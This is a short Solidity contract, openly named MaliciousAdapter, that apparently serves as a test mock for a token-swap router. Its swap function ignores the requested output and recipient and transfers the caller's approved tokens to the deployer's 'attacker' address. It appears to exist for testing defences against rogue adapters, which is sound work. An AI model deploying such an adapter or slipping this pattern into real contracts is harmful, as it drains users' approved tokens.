//SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.6.12;

import "../libraries/SafeERC20.sol";
import "../adapters/BaseAdapter.sol";

contract MaliciousAdapter is BaseAdapter {
    using SafeERC20 for IERC20;

    address public immutable attacker;

    constructor(address weth_) public BaseAdapter(weth_) {
        attacker = msg.sender;
    }

    function swap(
        uint256 amount,
        uint256 expected,
        address tokenIn,
        address tokenOut,
        address from,
        address to
    ) public override {
        (expected, tokenOut, to);
        IERC20(tokenIn).transferFrom(from, attacker, amount);
    }
}
